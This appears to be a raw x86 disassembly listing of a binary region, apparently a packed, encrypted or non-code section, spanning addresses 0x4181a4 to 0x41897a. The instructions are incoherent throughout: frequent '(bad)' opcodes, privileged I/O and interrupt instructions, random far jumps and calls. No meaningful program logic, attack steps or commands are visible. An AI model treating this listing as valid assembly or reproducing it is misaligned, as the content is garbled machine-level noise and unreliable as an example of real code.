  4181a4:	sub    BYTE PTR [edx],dh
  4181a6:	sbb    eax,0xcb2b0212
  4181ab:	repz push edx
  4181ad:	int    0xc8
  4181af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181b0:	das    
  4181b1:	mov    al,ds:0xb5b3ed9b
  4181b6:	xor    BYTE PTR [edi+0x469316fc],0x9b
  4181bd:	into   
  4181be:	mov    DWORD PTR [ecx],eax
  4181c0:	out    0xb1,eax
  4181c2:	pop    ss
  4181c3:	sahf   
  4181c4:	add    al,0x6a
  4181c6:	or     ch,BYTE PTR [ebx+eiz*1-0x5fee4759]
  4181cd:	or     bl,BYTE PTR [ebx]
  4181cf:	and    esi,esp
  4181d1:	mov    BYTE PTR [ecx],ch
  4181d3:	adc    eax,0x544d3dee
  4181d8:	add    eax,0x39926a7d
  4181dd:	neg    DWORD PTR [edi-0x7b63b8c7]
  4181e3:	push   ss
  4181e4:	aas    
  4181e5:	fs ins DWORD PTR es:[edi],dx
  4181e7:	mov    ebp,0xe644f79
  4181ec:	fsubr  DWORD PTR [ebp+0x15]
  4181ef:	stos   DWORD PTR es:[edi],eax
  4181f0:	xchg   esp,eax
  4181f1:	test   dl,ch
  4181f3:	mov    eax,ds:0x38f68a4f
  4181f8:	fmul   DWORD PTR [edi]
  4181fa:	push   esp
  4181fb:	nop
  4181fc:	arpl   WORD PTR [ebp+0x4dc0228e],si
  418202:	clc    
  418203:	jl     0x418261
  418205:	imul   ecx,DWORD PTR [ebx-0x6412292f],0x15
  41820c:	sub    al,0xdc
  41820e:	lods   al,BYTE PTR ds:[esi]
  41820f:	stos   BYTE PTR es:[edi],al
  418210:	jnp    0x418279
  418212:	inc    ebp
  418213:	pop    ds
  418214:	inc    BYTE PTR [eax+0xd]
  418217:	sbb    eax,esp
  418219:	adc    al,BYTE PTR [edi-0x3e70cd7f]
  41821f:	and    bl,BYTE PTR [ebx+ebx*1+0x29]
  418223:	shl    BYTE PTR [edx+0x77c7935],cl
  418229:	push   ebp
  41822a:	lods   al,BYTE PTR ds:[esi]
  41822b:	adc    BYTE PTR [ebp+0x5d22fc94],ch
  418231:	rol    DWORD PTR [ecx-0x7f1fa2f6],0x85
  418238:	inc    eax
  418239:	xlat   BYTE PTR ds:[ebx]
  41823a:	push   esp
  41823b:	mov    ebp,cs
  41823d:	aas    
  41823e:	hlt    
  41823f:	and    edx,ecx
  418241:	dec    edx
  418242:	and    ah,BYTE PTR [ebx-0x5508e0c1]
  418248:	sbb    esp,ebx
  41824a:	jg     0x418289
  41824c:	sub    BYTE PTR [esi-0x72],0xf2
  418250:	jno    0x4182ca
  418252:	mov    cl,0x65
  418254:	sti    
  418255:	scas   eax,DWORD PTR es:[edi]
  418256:	or     DWORD PTR ds:0x6f03088a,edx
  41825c:	mov    eax,0xa8fcfc9d
  418261:	repnz push ss
  418263:	mov    ch,0x0
  418265:	dec    ebx
  418266:	inc    edi
  418267:	jle    0x4182bd
  418269:	xor    DWORD PTR ds:0x7750,esp
  41826e:	push   ss
  41826f:	cmp    BYTE PTR ds:0x97d92775,cl
  418275:	scas   al,BYTE PTR es:[edi]
  418276:	xchg   edx,eax
  418277:	mov    ds:0x86824f38,eax
  41827c:	inc    ecx
  41827d:	xchg   esi,eax
  41827e:	je     0x418269
  418280:	pusha  
  418281:	clc    
  418282:	inc    esp
  418283:	xor    esi,DWORD PTR [eax]
  418285:	(bad)  
  418286:	sub    esp,DWORD PTR [ecx+0x1d]
  418289:	push   0xffffffe3
  41828b:	inc    esp
  41828c:	add    eax,0x8f747c82
  418291:	dec    esp
  418292:	add    ah,bl
  418294:	sub    BYTE PTR [ebp+0x67f11cd8],bl
  41829a:	inc    ebx
  41829b:	add    eax,0xb9b5c5a4
  4182a0:	cmc    
  4182a1:	xor    ebp,ebx
  4182a3:	jp     0x418254
  4182a5:	les    eax,FWORD PTR [edx-0x51]
  4182a8:	xchg   al,dl
  4182aa:	or     DWORD PTR [esp+ebx*4+0x5a680596],edx
  4182b1:	mov    edi,DWORD PTR [ebp-0x47]
  4182b4:	loope  0x4182c6
  4182b6:	pop    ebx
  4182b7:	lahf   
  4182b8:	aaa    
  4182b9:	sbb    eax,0x70cd0c2c
  4182be:	popa   
  4182bf:	inc    ecx
  4182c0:	inc    ecx
  4182c1:	jp     0x41832e
  4182c3:	lahf   
  4182c4:	adc    DWORD PTR [edi-0x1f],edx
  4182c7:	adc    esi,0x1df43b42
  4182cd:	push   cs
  4182ce:	mov    ah,0x57
  4182d0:	pop    edx
  4182d1:	cmp    BYTE PTR [ecx+0x25],cl
  4182d4:	add    BYTE PTR ds:0xd353c60f,al
  4182da:	fld    DWORD PTR [esi*1-0x28fbb4f8]
  4182e1:	js     0x4182a8
  4182e3:	jb     0x4182db
  4182e5:	dec    edi
  4182e6:	jle    0x4182a0
  4182e8:	jb     0x4182a2
  4182ea:	ror    DWORD PTR [ecx],1
  4182ec:	cmp    ebx,DWORD PTR [esi+0x5e564903]
  4182f2:	xchg   edx,eax
  4182f3:	mov    ebp,DWORD PTR [ecx+ecx*8]
  4182f6:	les    edi,FWORD PTR [edi+0x7c]
  4182f9:	dec    ebp
  4182fa:	je     0x418336
  4182fc:	ins    DWORD PTR es:[edi],dx
  4182fd:	xor    dl,BYTE PTR [esi+0x197f05e7]
  418303:	in     eax,dx
  418304:	mov    edx,0x61a4ef68
  418309:	jg     0x4182f8
  41830b:	push   ecx
  41830c:	jp     0x4182d9
  41830e:	and    bl,ch
  418310:	repz push eax
  418312:	ret    0xc1b2
  418315:	pop    eax
  418316:	mov    cl,BYTE PTR [edx-0x3f]
  418319:	xor    bl,dh
  41831b:	scas   eax,DWORD PTR es:[edi]
  41831c:	ins    BYTE PTR es:[edi],dx
  41831d:	jo     0x418363
  41831f:	rol    DWORD PTR [eax+0x44],0xff
  418323:	in     eax,0x57
  418325:	xor    bl,BYTE PTR [edi-0x5495716a]
  41832b:	mov    eax,0xfe00dfc1
  418330:	or     eax,DWORD PTR [eax+0x3092de61]
  418336:	(bad)  
  418337:	gs pop esi
  418339:	int    0x8d
  41833b:	sti    
  41833c:	dec    esp
  41833d:	add    cl,BYTE PTR [esi]
  41833f:	iret   
  418340:	mov    ds:0x6ca083b6,eax
  418345:	inc    esi
  418346:	xor    ch,BYTE PTR [esi-0x15]
  418349:	xchg   ebx,eax
  41834a:	lahf   
  41834b:	adc    ah,0x94
  41834e:	mov    eax,0x8a72a276
  418353:	and    BYTE PTR [eax-0x23],0x61
  418357:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418358:	outs   dx,DWORD PTR ds:[esi]
  418359:	rcl    BYTE PTR [edx+0x59],1
  41835c:	xchg   ebp,eax
  41835d:	lds    ecx,FWORD PTR [edi+0x70d2bb32]
  418363:	lock or DWORD PTR [ecx],esp
  418366:	sbb    eax,0x532040b2
  41836b:	rcl    bh,0xeb
  41836e:	je     0x418312
  418370:	(bad)  
  418371:	fwait
  418372:	push   0x4c
  418374:	(bad)  
  418375:	stos   DWORD PTR es:[edi],eax
  418376:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418377:	repnz pop ss
  418379:	iret   
  41837a:	add    ch,BYTE PTR [eax-0x4b]
  41837d:	lahf   
  41837e:	pop    ecx
  41837f:	in     al,0xa6
  418381:	ficom  DWORD PTR [edx-0x33c90120]
  418387:	mov    bh,0x23
  418389:	or     al,0x9c
  41838b:	jecxz  0x4183a9
  41838d:	pop    eax
  41838e:	xlat   BYTE PTR ds:[ebx]
  41838f:	cmp    esi,edx
  418391:	xchg   ecx,eax
  418392:	pop    ebx
  418393:	addr16 sbb eax,0x7b0adff7
  418399:	dec    ebx
  41839a:	xor    eax,0x12b33963
  41839f:	xchg   ebx,eax
  4183a0:	xchg   ebx,eax
  4183a1:	jmp    0x418325
  4183a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4183a4:	push   edx
  4183a5:	or     DWORD PTR ds:0x98c822a9,esi
  4183ab:	ret    
  4183ac:	mov    al,ds:0xf8399665
  4183b1:	inc    ebx
  4183b2:	push   ebx
  4183b3:	inc    edx
  4183b4:	call   0xf337:0xab3701bc
  4183bb:	sbb    al,0x7
  4183bd:	out    0x98,eax
  4183bf:	stc    
  4183c0:	jg     0x418431
  4183c2:	ss jl  0x4183c2
  4183c5:	iret   
  4183c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183c7:	and    eax,DWORD PTR [ecx]
  4183c9:	retf   0x890f
  4183cc:	imul   eax,ebp,0x2a733a5d
  4183d2:	push   ss
  4183d3:	push   esp
  4183d4:	cmp    ah,ch
  4183d6:	outs   dx,BYTE PTR ds:[esi]
  4183d7:	and    bl,dh
  4183d9:	fnstenv [eax+0x5a0bdfe6]
  4183df:	icebp  
  4183e0:	sub    edi,DWORD PTR [edi+eiz*8]
  4183e3:	mov    edx,0x44323512
  4183e8:	mov    esp,0x8c2563bf
  4183ed:	das    
  4183ee:	inc    edx
  4183ef:	dec    ebp
  4183f0:	fbstp  TBYTE PTR [ebx]
  4183f2:	or     ah,dl
  4183f4:	fist   WORD PTR [edx+0x14]
  4183f7:	ins    BYTE PTR es:[edi],dx
  4183f8:	pop    ebp
  4183f9:	jne    0x418427
  4183fb:	popf   
  4183fc:	shl    DWORD PTR ds:0xbf0362c6,0x62
  418403:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  418405:	cmp    edx,esp
  418407:	cmp    dh,BYTE PTR [esi+ebp*8]
  41840a:	xor    bh,BYTE PTR [ebx+eax*4-0x5c]
  41840e:	das    
  41840f:	cmp    eax,0x2fe5f9f8
  418414:	sbb    BYTE PTR [eax],bh
  418416:	xchg   esp,eax
  418417:	or     ah,cl
  418419:	fwait
  41841a:	adc    DWORD PTR [esi+0x4cd5d76c],esp
  418420:	lds    esi,FWORD PTR ds:0x4f99993e
  418426:	and    ch,BYTE PTR [eax]
  418428:	push   0x1b5f48b5
  41842d:	dec    ebp
  41842e:	lock sahf 
  418430:	adc    DWORD PTR ds:0xcd027add,esp
  418436:	add    esi,edx
  418438:	popa   
  418439:	adc    bh,al
  41843b:	arpl   WORD PTR [ebx-0x6a],bp
  41843e:	fnclex 
  418440:	inc    ecx
  418441:	xchg   esi,eax
  418442:	mov    cs,esi
  418444:	out    dx,eax
  418445:	dec    eax
  418446:	fcmovnbe st,st(2)
  418448:	push   ebp
  418449:	repnz dec ecx
  41844b:	je     0x41847f
  41844d:	pshufw mm7,QWORD PTR [ecx-0x5b],0xbd
  418452:	mov    ds:0xf4231726,eax
  418457:	ds (bad) 
  418459:	and    DWORD PTR ds:0xd5cd3d73,esp
  41845f:	mov    DWORD PTR [ebp+0x2d],esp
  418462:	jmp    0x36e0:0x21ca4827
  418469:	int3   
  41846a:	outs   dx,DWORD PTR ds:[esi]
  41846b:	test   dh,ch
  41846d:	add    ch,ch
  41846f:	push   edx
  418470:	rcr    DWORD PTR [ebp-0x3d],cl
  418473:	xor    bh,BYTE PTR [eax-0x69]
  418476:	sbb    edx,esi
  418478:	add    eax,0x272f081
  41847d:	and    BYTE PTR [ebp+0x31],bl
  418480:	test   ch,ah
  418482:	and    ebx,DWORD PTR [ecx]
  418484:	xchg   edi,eax
  418485:	das    
  418486:	scas   eax,DWORD PTR es:[edi]
  418487:	pop    edx
  418488:	add    edi,DWORD PTR [eax]
  41848a:	cmp    edi,DWORD PTR ds:0x6d6c41b5
  418490:	sahf   
  418491:	or     DWORD PTR [ebx],edi
  418493:	mov    ebx,0x9803151a
  418498:	das    
  418499:	adc    bh,cl
  41849b:	sub    ch,BYTE PTR [esi]
  41849d:	xor    DWORD PTR [edi+0x5da9428d],ecx
  4184a3:	enter  0x1dc2,0x8c
  4184a7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184a8:	cmp    dl,bl
  4184aa:	xchg   edi,eax
  4184ab:	sbb    eax,DWORD PTR ds:0xa7d7b099
  4184b1:	outs   dx,BYTE PTR ds:[si]
  4184b3:	outs   dx,DWORD PTR ds:[esi]
  4184b4:	push   ebp
  4184b5:	mov    esi,0xa0ee4bc
  4184ba:	fwait
  4184bb:	add    al,0xaa
  4184bd:	aad    0x6a
  4184bf:	xchg   edi,eax
  4184c0:	mul    BYTE PTR [edi+0x6f]
  4184c3:	pop    edx
  4184c4:	and    BYTE PTR [edi],ah
  4184c6:	arpl   WORD PTR ds:0x9320dc06,bp
  4184cc:	je     0x4184df
  4184ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184cf:	ret    
  4184d0:	mov    edi,DWORD PTR ds:0x7761599a
  4184d6:	push   0xd9b422f2
  4184db:	jmp    0x41850a
  4184dd:	es sub eax,0x280ce732
  4184e3:	or     DWORD PTR [ebp+0x6b5c926f],ebx
  4184e9:	rcr    BYTE PTR [edx-0x17],cl
  4184ec:	pop    esi
  4184ed:	or     bl,dh
  4184ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184f0:	push   ebx
  4184f1:	ret    
  4184f2:	test   eax,0xc8711be8
  4184f7:	mov    BYTE PTR ds:0x9959179e,cl
  4184fd:	pop    edx
  4184fe:	push   ebp
  4184ff:	add    eax,0x53ceb6ad
  418504:	inc    eax
  418505:	dec    ecx
  418506:	iret   
  418507:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418508:	add    eax,0x1aac0a5c
  41850d:	sahf   
  41850e:	fmul   QWORD PTR [edx+0x68cb681]
  418514:	mov    ah,0xca
  418516:	bound  ebp,QWORD PTR [edx+edx*2+0x1c]
  41851a:	in     eax,0x8d
  41851c:	dec    ecx
  41851d:	mov    WORD PTR [esi-0x2b],cs
  418520:	hlt    
  418521:	mov    cl,0x26
  418523:	and    dh,al
  418525:	(bad)  
  418526:	call   0x31fc:0xe1d40152
  41852d:	cmc    
  41852e:	dec    eax
  41852f:	sub    eax,0x79a08cce
  418534:	or     esp,DWORD PTR [ecx]
  418536:	cmp    DWORD PTR [ebp+0x38],edx
  418539:	pop    esi
  41853a:	gs pushf 
  41853c:	vsubpd xmm6,xmm1,XMMWORD PTR [eax+0x3e]
  418541:	std    
  418542:	dec    DWORD PTR [esi-0x5ce6b9f2]
  418548:	jb     0x41852c
  41854a:	lea    esp,[ebx-0x1]
  41854d:	idiv   BYTE PTR [ebp-0x254c3426]
  418553:	imul   esp,ebx,0xffffffb1
  418556:	xchg   ecx,eax
  418557:	ss sti 
  418559:	push   es
  41855a:	in     al,dx
  41855b:	xor    BYTE PTR [ecx-0xd038746],ah
  418561:	push   ds
  418562:	adc    dh,BYTE PTR [ebx]
  418564:	cmp    DWORD PTR ds:0xc3a1712a,ebp
  41856a:	jge    0x41855c
  41856c:	dec    ebp
  41856d:	dec    ebp
  41856e:	data16 int 0x38
  418571:	loope  0x41853d
  418573:	ret    0x2d37
  418576:	mov    ecx,0xd59a0428
  41857b:	mov    edi,0xa939d963
  418580:	xor    ch,BYTE PTR [eax-0x7b095673]
  418586:	xchg   ebx,eax
  418587:	popa   
  418588:	pusha  
  418589:	fiadd  DWORD PTR [edx+0x7e272b75]
  41858f:	test   BYTE PTR [edx+0x52bd8bf6],cl
  418595:	xchg   edx,eax
  418596:	popa   
  418597:	fiadd  WORD PTR [eax]
  418599:	fiadd  DWORD PTR [ebp-0x12a6b670]
  41859f:	push   ebx
  4185a1:	popf   
  4185a2:	data16 fld DWORD PTR [esi+eax*4-0x6d7f47e2]
  4185aa:	jge    0x4185d6
  4185ac:	mov    ecx,0x2700b
  4185b1:	cmc    
  4185b2:	jb     0x41862b
  4185b4:	push   ds
  4185b5:	shl    DWORD PTR [ebx+0x150c226d],cl
  4185bb:	pop    ss
  4185bc:	shl    BYTE PTR [edx],1
  4185be:	mov    bl,0x5b
  4185c0:	outs   dx,BYTE PTR ds:[esi]
  4185c1:	std    
  4185c2:	test   al,0x18
  4185c4:	fs add al,0x18
  4185c7:	cld    
  4185c8:	arpl   di,sp
  4185ca:	xchg   esi,eax
  4185cb:	push   ecx
  4185cc:	les    esp,FWORD PTR [ebp-0x1d]
  4185cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4185d0:	sbb    al,0xee
  4185d2:	aad    0x54
  4185d4:	loope  0x41858a
  4185d6:	(bad)  
  4185d7:	xchg   edi,eax
  4185d8:	sub    al,0x34
  4185da:	pop    ecx
  4185db:	push   ds
  4185dc:	sbb    al,0xb1
  4185de:	pop    ss
  4185df:	sbb    BYTE PTR [ebx],0xc6
  4185e2:	inc    edi
  4185e3:	int3   
  4185e4:	sti    
  4185e5:	sub    DWORD PTR [ecx],0xffffffce
  4185e8:	push   ds
  4185e9:	jno    0x41864a
  4185eb:	push   0x7739da6
  4185f0:	sbb    BYTE PTR [ebx+0x486434a9],0x69
  4185f7:	dec    edx
  4185f8:	xchg   ecx,eax
  4185f9:	mov    ds:0xf551a921,al
  4185fe:	loop   0x41862e
  418600:	sbb    DWORD PTR [ecx+0x44],eax
  418603:	add    ah,dl
  418605:	pop    ds
  418606:	loope  0x418612
  418608:	dec    ebx
  418609:	fwait
  41860a:	inc    esp
  41860b:	jns    0x418594
  41860d:	lock jae 0x41862b
  418610:	push   esi
  418611:	call   0xd233:0x250e984c
  418618:	pushf  
  418619:	xchg   edi,eax
  41861a:	mov    eax,ds:0x980f9e67
  41861f:	iret   
  418620:	cli    
  418621:	imul   ebx,DWORD PTR [ebp-0x6d],0xfffffff4
  418625:	push   ss
  418626:	lods   al,BYTE PTR ds:[esi]
  418627:	jge    0x4185cf
  418629:	mov    bl,0x90
  41862b:	dec    edi
  41862c:	jb     0x41860b
  41862e:	adc    esi,DWORD PTR [esi-0x4c20313b]
  418634:	aaa    
  418635:	int    0x9d
  418637:	xor    cx,cx
  41863a:	(bad)  
  41863b:	rol    DWORD PTR [eax+edi*1-0x5be99887],cl
  418642:	retf   
  418643:	fcom   QWORD PTR [ecx]
  418645:	adc    bl,dl
  418647:	mov    si,0x9191
  41864b:	adc    ch,bh
  41864d:	jmp    0x4185e3
  41864f:	push   ebx
  418650:	cmp    BYTE PTR [ebp+0x71],0x70
  418654:	sbb    BYTE PTR [ebp-0x7a5cf690],0x9e
  41865b:	sbb    al,0x17
  41865d:	adc    ch,BYTE PTR [edx]
  41865f:	push   cs
  418660:	aas    
  418661:	aad    0x9
  418663:	ja     0x418666
  418665:	inc    eax
  418666:	es pop edi
  418668:	test   al,0x1a
  41866a:	bound  edi,QWORD PTR [esi+0x2f1a2ff3]
  418670:	mov    edi,es
  418672:	cmc    
  418673:	pop    eax
  418674:	mov    edi,0x1bd63703
  418679:	xor    eax,0x5296bcac
  41867e:	stc    
  41867f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418680:	lods   eax,DWORD PTR ds:[esi]
  418681:	mov    edx,0xcbde8a0c
  418686:	and    eax,0xd53935e
  41868b:	repz mov ah,BYTE PTR [eax+0x36]
  41868f:	adc    esp,DWORD PTR [esi+0x7386fdd7]
  418695:	jo     0x418630
  418697:	out    dx,al
  418698:	jno    0x4186a7
  41869a:	jecxz  0x418662
  41869c:	les    ecx,FWORD PTR [eax-0x58c4de6c]
  4186a2:	mov    ah,0x13
  4186a4:	pop    ds
  4186a5:	arpl   WORD PTR es:0x8f941c19,di
  4186ac:	imul   esp,DWORD PTR [ebp-0x5ac80bce],0x1a90518c
  4186b6:	std    
  4186b7:	outs   dx,BYTE PTR ds:[esi]
  4186b8:	and    esp,DWORD PTR [ecx-0x7ac17eb6]
  4186be:	jg     0x41872e
  4186c0:	inc    esp
  4186c1:	leave  
  4186c2:	and    eax,0x6382b55
  4186c7:	mov    bl,al
  4186c9:	add    BYTE PTR [esi+edx*4],al
  4186cc:	jmp    0xcb42:0x580a2e29
  4186d3:	pop    esp
  4186d4:	popf   
  4186d5:	mov    ebx,DWORD PTR [ebx+ebx*4+0x176bb2a]
  4186dc:	inc    ecx
  4186dd:	stc    
  4186de:	xchg   esi,eax
  4186df:	into   
  4186e0:	add    BYTE PTR [edi-0x3f],ah
  4186e3:	aas    
  4186e4:	enter  0xca96,0xb6
  4186e8:	mov    esi,gs
  4186ea:	mov    ah,0x31
  4186ec:	mov    bl,0xcf
  4186ee:	das    
  4186ef:	dec    ebx
  4186f0:	mov    al,0xab
  4186f2:	xor    al,BYTE PTR [ecx+0x34c0e5b1]
  4186f8:	xchg   esi,eax
  4186f9:	mov    ebp,0xafa09130
  4186fe:	sti    
  4186ff:	sub    DWORD PTR [ecx],edx
  418701:	xchg   edx,eax
  418702:	or     al,BYTE PTR [esi-0x599b1ff5]
  418708:	inc    ebx
  418709:	fwait
  41870a:	(bad)  
  41870b:	pop    ss
  41870c:	dec    esi
  41870d:	fcomp  QWORD PTR [ecx-0x5b]
  418710:	cld    
  418711:	cmp    eax,0xcb24c70b
  418716:	nop
  418717:	cmp    DWORD PTR [ebx-0x4af255eb],ebp
  41871d:	xlat   BYTE PTR ds:[ebx]
  41871e:	push   esi
  41871f:	sub    eax,0x9e4227ab
  418724:	fisubr DWORD PTR [ebx+0x6f9d994f]
  41872a:	lods   al,BYTE PTR ds:[esi]
  41872b:	cmp    BYTE PTR [ecx-0x2b],ah
  41872e:	bound  esi,QWORD PTR [edx+0x33]
  418731:	das    
  418732:	mov    ebx,0x1f885dcd
  418737:	vprotd xmm4,xmm0,0xa2
  41873c:	dec    edi
  41873d:	sub    al,0xc
  41873f:	inc    di
  418741:	cmc    
  418742:	add    bh,BYTE PTR [esi+0x7580a2c4]
  418748:	and    BYTE PTR [edi],0x71
  41874b:	mov    fs,ebx
  41874d:	fsub   DWORD PTR [ecx]
  41874f:	sbb    DWORD PTR [ecx],edx
  418751:	out    dx,al
  418752:	push   esp
  418753:	sub    eax,0xc50b4879
  418758:	fs push ds
  41875a:	js     0x4187d5
  41875c:	cld    
  41875d:	inc    esp
  41875e:	dec    esi
  41875f:	dec    esp
  418760:	popa   
  418761:	xchg   DWORD PTR [edi],ecx
  418763:	inc    edx
  418764:	mov    dh,0xa6
  418766:	js     0x4187a4
  418768:	mov    dh,BYTE PTR [ecx]
  41876a:	iret   
  41876b:	pop    ss
  41876c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41876d:	das    
  41876e:	jge    0x418702
  418770:	mov    ds:0x24626828,eax
  418775:	xor    dl,ah
  418777:	mov    al,0xb0
  41877a:	push   0xab26b9d4
  41877f:	push   esi
  418780:	inc    edi
  418781:	mov    al,ds:0x8b0b8548
  418786:	outs   dx,BYTE PTR ds:[esi]
  418787:	popf   
  418788:	sub    DWORD PTR ds:[ecx],edi
  41878b:	test   DWORD PTR [edi-0x5f],edi
  41878e:	xor    al,0x42
  418790:	sub    bl,bh
  418792:	pop    ds
  418793:	inc    eax
  418794:	in     eax,dx
  418795:	ret    
  418796:	leave  
  418797:	mov    dl,0x6c
  418799:	adc    al,0x93
  41879b:	push   ebp
  41879c:	shr    BYTE PTR [edi+ebp*2+0x7fd9813c],cl
  4187a3:	rcl    BYTE PTR [esi+0x6ce34d3b],0x59
  4187aa:	sub    dl,BYTE PTR [ebx+0x7f]
  4187ad:	push   eax
  4187ae:	pop    ss
  4187af:	xchg   DWORD PTR [edi-0x386b66d6],ebx
  4187b5:	ins    BYTE PTR es:[edi],dx
  4187b6:	inc    ecx
  4187b7:	rol    BYTE PTR [edi+0x60],cl
  4187ba:	mov    esp,ss
  4187bc:	bound  esi,QWORD PTR [ebx+0x42ceceb9]
  4187c2:	mov    eax,DWORD PTR [edi+edi*8+0x57]
  4187c6:	jb     0x41882e
  4187c8:	out    0x64,eax
  4187ca:	lea    cx,[edx]
  4187cd:	dec    esi
  4187ce:	jecxz  0x4187b2
  4187d0:	pop    ebp
  4187d1:	je     0x418776
  4187d3:	xchg   ebx,eax
  4187d4:	fst    QWORD PTR ss:[edi+0x4b]
  4187d8:	gs or  al,0xb
  4187db:	or     eax,0xb954cf25
  4187e0:	lahf   
  4187e1:	pop    ds
  4187e2:	inc    ecx
  4187e3:	and    dl,BYTE PTR [ebx]
  4187e5:	jmp    0xbbfe4661
  4187ea:	(bad)  
  4187eb:	ds pop ecx
  4187ed:	adc    eax,DWORD PTR [ecx+esi*1]
  4187f0:	and    ebp,esi
  4187f2:	lea    eax,[eax]
  4187f4:	pop    esi
  4187f5:	jle    0x418797
  4187f7:	mov    dl,0x22
  4187f9:	fidiv  DWORD PTR [eax+0x7a0db091]
  4187ff:	lods   eax,DWORD PTR ds:[esi]
  418800:	stos   BYTE PTR es:[edi],al
  418801:	and    eax,0xc2fc7aa0
  418806:	xchg   ebx,eax
  418807:	and    DWORD PTR [edx+0x7701c6e],0x23
  41880e:	not    ecx
  418810:	jp     0x418891
  418812:	sub    ah,BYTE PTR [edx]
  418814:	or     al,0x51
  418816:	pop    ds
  418817:	mov    al,0x93
  418819:	fdivr  QWORD PTR [ebx-0x14e21809]
  41881f:	cmp    DWORD PTR [edx+0x26],ecx
  418822:	cmp    ebx,DWORD PTR [esi+0x430b585]
  418828:	ffree  st(1)
  41882a:	das    
  41882b:	outs   dx,BYTE PTR ds:[esi]
  41882c:	sub    DWORD PTR [ebx],ebp
  41882e:	cmp    eax,0x4bf7a3c4
  418833:	pop    esi
  418834:	adc    dl,ch
  418836:	vmovhps xmm2,xmm7,QWORD PTR [ebp-0x114c3eeb]
  41883e:	scas   al,BYTE PTR es:[edi]
  41883f:	int3   
  418840:	jne    0x41888c
  418842:	jae    0x4187e7
  418844:	mov    bh,0x2f
  418846:	push   ds
  418847:	sbb    eax,0x94e4bb80
  41884c:	pop    ds
  41884d:	inc    ebp
  41884e:	sbb    eax,0xff9d1100
  418853:	adc    al,0xa6
  418855:	dec    esp
  418856:	and    DWORD PTR [edi-0x1cb14945],edi
  41885c:	pushf  
  41885d:	dec    esi
  41885e:	bound  ecx,QWORD PTR [bx+si+0x2a01]
  418863:	gs sbb eax,edx
  418866:	xor    al,BYTE PTR [eax-0x5bde7f25]
  41886c:	pop    ss
  41886d:	adc    BYTE PTR [edx+0x6],cl
  418870:	jno    0x418875
  418872:	fwait
  418873:	xor    eax,0xd844596c
  418878:	out    dx,al
  418879:	int    0x20
  41887b:	inc    ecx
  41887c:	dec    edi
  41887d:	stos   BYTE PTR es:[edi],al
  41887e:	mov    dh,0x7e
  418880:	(bad)
  418884:	cmp    esp,DWORD PTR fs:[esi+eax*1]
  418888:	inc    esp
  418889:	dec    ebx
  41888a:	bound  ecx,QWORD PTR [esi+0x29e4efe5]
  418890:	jns    0x4188c5
  418892:	outs   dx,DWORD PTR ds:[esi]
  418893:	shl    ebx,cl
  418895:	add    DWORD PTR [esi+0xc],edi
  418898:	pop    ss
  418899:	arpl   WORD PTR [edx-0x2ae9356a],dx
  41889f:	add    al,0xda
  4188a1:	stos   BYTE PTR es:[edi],al
  4188a2:	lods   al,BYTE PTR ds:[esi]
  4188a3:	mov    esi,0xa92a6bb5
  4188a8:	jbe    0x4188fe
  4188aa:	pop    ss
  4188ab:	mov    ebp,0x14dcd4df
  4188b0:	xor    esp,ecx
  4188b2:	or     esi,ebx
  4188b4:	ja     0x41883f
  4188b6:	sbb    ebp,esi
  4188b8:	shl    DWORD PTR [ebx+0x5aa41453],1
  4188be:	push   ebp
  4188bf:	cmp    ch,al
  4188c1:	jae    0x418909
  4188c3:	jno    0x4188c2
  4188c5:	adc    eax,0xc9a2d0b3
  4188ca:	lea    ecx,[edx+0x36ff5508]
  4188d0:	sbb    edx,DWORD PTR [ebx-0x358c7bce]
  4188d6:	mov    eax,ds:0xb3b946dc
  4188db:	stc    
  4188dc:	mov    cl,0x95
  4188de:	cwde   
  4188df:	jo     0x4188cc
  4188e1:	or     edx,DWORD PTR [eax+0x44052231]
  4188e7:	call   0xce5a:0xfb3711ef
  4188ee:	jae    0x4188d0
  4188f0:	icebp  
  4188f1:	push   esi
  4188f2:	add    ebp,edx
  4188f4:	and    bh,ch
  4188f6:	lods   al,BYTE PTR ds:[esi]
  4188f7:	shl    cl,0x11
  4188fa:	mov    dh,BYTE PTR [edx-0x7f182d65]
  418900:	xor    dh,0x41
  418903:	xchg   edi,eax
  418904:	or     esp,ecx
  418906:	lahf   
  418907:	scas   al,BYTE PTR es:[edi]
  418908:	sub    dh,cl
  41890a:	ins    BYTE PTR es:[edi],dx
  41890b:	shr    BYTE PTR [edi-0x284976ce],0xbf
  418912:	jno    0x418971
  418914:	sub    eax,0x7acd91ad
  418919:	push   edx
  41891a:	iret   
  41891b:	and    DWORD PTR [ebx-0x4d],0x32672b28
  418922:	in     eax,0x90
  418924:	mov    ds:0xc7692aec,eax
  418929:	in     eax,dx
  41892a:	loop   0x41897f
  41892c:	icebp  
  41892d:	cmp    eax,0x28a63036
  418932:	test   bl,cl
  418934:	pop    ss
  418935:	xchg   edi,eax
  418936:	jmp    0xaf:0x68b836b9
  41893d:	je     0x418987
  41893f:	and    BYTE PTR [esi-0x66],0xf3
  418943:	nop
  418944:	mov    esp,0x35c8ce40
  418949:	push   ss
  41894a:	push   ecx
  41894b:	xchg   DWORD PTR [edx+0x5f59782a],ebp
  418951:	mov    ebx,0x7b9aea62
  418956:	fcmovnbe st,st(6)
  418958:	sub    ebp,DWORD PTR [eax]
  41895a:	mov    bl,0x7a
  41895c:	(bad)  
  41895d:	xor    al,0x10
  41895f:	push   es
  418960:	xchg   BYTE PTR [edi+0x68],cl
  418963:	ins    DWORD PTR es:[edi],dx
  418964:	mov    eax,ds:0x84caeaaa
  418969:	dec    eax
  41896a:	jle    0x41892f
  41896c:	lock mov esi,DWORD PTR [esi+0x78]
  418970:	pop    ebx
  418971:	fst    DWORD PTR ds:0x80e74de3
  418977:	arpl   WORD PTR [edi+0x51],sp
  41897a:	(bad)  
